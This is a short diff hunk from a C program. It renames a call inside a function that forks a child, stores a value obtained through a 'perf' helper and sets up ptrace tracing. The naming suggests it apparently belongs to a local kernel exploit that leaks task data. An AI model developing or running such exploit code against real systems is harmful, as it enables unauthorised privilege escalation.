@@ -982,7 +982,7 @@ uintptr_t fp_helper_setup(uintptr_t value, uintptr_t target, pid_t *out_pid) {
   *sh = 0;
   pid_t c = fork();
   if (c == 0) {
-    uint64_t dm = perf_task_dm_leak();
+    uint64_t dm = perf_find_task();
     *sh = dm;
     if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) _exit(3);
     raise(SIGSTOP);
